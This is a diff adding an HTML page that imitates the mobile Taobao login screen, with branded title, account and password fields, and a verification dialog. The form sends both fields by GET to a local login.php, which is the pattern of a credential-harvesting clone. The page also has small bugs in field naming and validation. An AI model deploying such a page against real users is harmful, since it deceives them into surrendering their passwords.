@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>淘宝网</title>
+  <script src="http://g.tbcdn.cn/mtb/lib-flexible/0.3.4/??flexible_css.js,flexible.js"></script>
+  <style>
+    *{
+      margin: 0;
+      padding: 0;
+    }
+    @font-face{font-family:iconfont;src:url(font-family/1.svg);src:url(font-family/2.ttf) format('embedded-opentype'),url(font-family/3.eot) format('woff'),url(font-family/4.woff) format('truetype'),url(font-family/5.eot) format('svg')}
+    html,body{
+      width: 100%;
+      height: 100%;
+      color: #000;
+      background-color: #f0f0f0;
+      overflow-y: scroll;
+      font-family: sans-serif;
+    }
+    .head{
+      width: 100%;
+      height: 1.173333rem;
+      line-height: 1.173333rem;
+      border-bottom: 1px solid  #c8c8c8;
+      color: #000;
+      text-align: center;
+      font-size: .426667rem;
+      background-color: #f7f7f7;
+    }
+    .mlogin{
+      margin-top: .466667rem;
+      font-size: .426667rem
+    }
+    .mlogin .field{
+      display: -webkit-flex;
+      display: -ms-flex;
+      display: flex;
+      -webkit-box-align:center;
+      -webkit-align-item:center;
+      border-bottom: 1px solid  #ddd;
+      padding: .373333rem .266667rem;
+      color: #6c6c6c;
+      background-color: #fff;
+      text-align: left;
+    }
+    .field .label{
+      width: 2rem;
+    }
+    /*.label{
+      margin-left: -10px;
+    }*/
+    .field .field-control{
+      -webkit-flex: 1;
+      -webkit-box-flex:1;
+    }
+    .field .field-control input{
+      -webkit-appearance: none;
+      appearance: none;width: 100%;
+      padding: 0;
+      border: 0;
+      background-color: transparent;
+    }
+    .icon-clear{
+      visibility: hidden;
+    }
+    .mlogin .iconfont{
+      font-size: .426667rem;
+      color: #6c6c6c;
+    }
+    .iconfont{
+      font-family: iconfont!important;
+      font-style: normal;
+      -webkit-font-smoothing: antialiased;
+      -webkit-text-stroke-width: .2px;
+    }
+    .submit button:disabled{
+      color: #ffa286;
+    }
+    .button{
+      width: 100%;
+      height: 1.253333rem;
+      line-height: 1.252333;
+      border: 1px solid  #f40;
+      border-radius: 5px;
+      background-color: #f40;
+      text-align: center;
+      font-size: .426667rem;
+      display: block;
+      color:#fff;
+    }
+    .submit{
+      margin: .48rem .266667rem 0;
+
+    }
+    .other-link{
+      overflow: hidden;
+      margin: .4rem .26667rem;
+      color: #6c6c6c;
+    }
+    .ft-left{
+      float: left;
+    }
+    .ft-right{
+      float: right;
+    }
+    a{
+      color: #f40;
+      text-decoration: none;
+    }
+    .checkcode-wrap{
+      margin: .266667rem .266667rem 0;
+    }
+    ::-webkit-input-placeholder{
+      color: #ddd;
+    }
+    .km-dialog{
+    display: none;
+    font-size: .426667rem;
+    position: fixed;
+    border-radius: .2rem;
+    background-color: #fff;
+    top: 50%;
+    left: 50%;
+    z-index: 20;
+    padding-top: .3rem;
+    color: #6C6C6C;
+
+    }
+    .km-dialog .km-dialog-content {
+
+    padding: .3rem .6rem;
+    line-height: 1.2;
+    text-align: center;
+    }
+    .km-dialog .km-dialog-buttons {
+    margin-top: .3rem;
+    display: table;
+    width: 100%;
+    color: #F40;
+    border-top: 1px solid #DDD;
+  }
+  .km-dialog .km-dialog-buttons .km-dialog-btn:first-child{
+    border-left: 0;
+  }
+  .km-dialog .km-dialog-buttons .km-dialog-btn{
+    display: table-cell;
+    text-align: center;
+    width: 100%;
+    padding: .5rem;
+    border-left: 1px solid #ddd;
+  }
+  .km-dialog-mask{
+    display: none;
+    position: fixed;
+    width: 100%;
+    height: 100%;
+    z-index: 10;
+    background-color: #000;
+    opacity: .6;
+    left: 0;
+    top: 0;
+  }
+  </style>
+</head>
+<body style="font-size: 24px;">
+    <div class="head">
+      淘宝账户登入
+    </div>
+    <form action="login.php" method="get" id="loginForm" class="mlogin">
+      <div class="field autoClear">
+        <div class="label">账户</div>
+        <div class="field-control">
+          <input type="text" class="input-required" name="TPL_username" placeholder="手机号/邮箱/会员号" value="" id="username">
+        </div>
+        <div class="icon-clear">
+          <i class="iconfont">&#xe613;</i>
+        </div>
+      </div>
+      <div class="field autoClear">
+      <div class="label">登录密码</div>
+      <div class="field-control">
+        <input type="password" placeholder="请输入密码" id="password" name="TPL_username" class="input-required">
+      </div>
+      <div class="icon-clear">
+        <i class="iconfont">&#xe613;</i>
+      </div>
+      <div class="pwd pwdshow" id="show-pwd"></div>
+    </div>
+    <div class="checkcode-wrap"></div>
+    <div class="submit">
+      <button class="button" disabled="disabled" id="submit-btn">登录</button>
+    </div>
+    <div class="other-link">
+      <a href="javascript:;" class="ft-left">免费注册</a>
+      <a href="javascript:;" id="forget" class="ft-right">忘记密码</a>
+    </div>
+
+    </form>
+    <div class="km-dialog km-dialog-ios7 kom-dialog-alert" style="width:300px;height:auto;
+    margin-left:-150px;margin-top:-139.5px;visibility:visible;">
+      <div class="km-dialog-content">为了你的账户安全，请点击滑块上的圆圈完成验证</div>
+      <div class="km-dialog-buttons">
+        <span class="km-dialog-btn" data-idx="alert0">确定</span>
+      </div>
+    </div>
+    <div class="km-dialog-mask"></div>
+    <script type="text/javascript">
+    window.onload = function(){
+            var submitBtn = document.getElementById('submit-btn');
+            var userNameInput = document.querySelector('#username');
+            var passwordInput = document.querySelector('#password');
+            var oForm = document.querySelector('#loginForm');
+            function handleSubmitBtnStatus(){
+              var username = userNameInput.value;
+              var password = passwordInput.value;
+              if(username.length >　0 && password.length > 0)
+              {
+                submitBtn.removeAttribute('disabled');
+              }else{
+                submitBtn.setAttribute('disabled','disabled');
+              }
+            }
+            function handleInputClearIcon(oInput) {
+              var len = oInput.value.length;
+              var icon = oInput.parentNode.nextSibling.nextSibling;
+              console.log(icon);
+              if (len > 0) {
+                icon.style.visibility = 'visible';
+              }else{
+                icon.style.visibility = 'hidden';
+              }
+            }
+            userNameInput.addEventListener('input',function(){
+              // console.log('success');
+              // var username = this.value;
+              // var password = passwordInput.value;
+              // if(username.length >　0 && password.length > 0)
+              // {
+              //   submitBtn.removeAttribute('disabled');
+              // }
+              handleSubmitBtnStatus();
+              handleInputClearIcon(this);
+            },false);
+            passwordInput.addEventListener('input',function(){
+              // console.log('success');
+              handleSubmitBtnStatus();
+              handleInputClearIcon(this);
+            },false);
+            oForm.addEventListener('submit',function(event){
+              //阻止默认行为的发生，用于代码逻辑
+              event.preventDefault();
+              var username = userNameInput.value;
+              var password = passwordInput.value;
+              var oDialog = document.querySelector('.km-dialog-content');
+              var isOk = true;
+              if(username.length == 0 || username != 11){
+              oDialog.innerText = "您输入的用户名有误";
+              isOk = false;
+              }
+              if(password.length < 6) {
+                oDialog.innerText = "您输入的密码至少要6位";
+                isOk = false;
+              }
+              if(isOk){
+                this.submit();
+              }  else{
+                document.querySelector('.km-dialog-mask').style.display="block";
+                document.querySelector('.km-dialog').style.display="block";
+              }
+
+              //  alert("a");
+
+            },false);
+          }
+
+    </script>
+</body>
+</html>
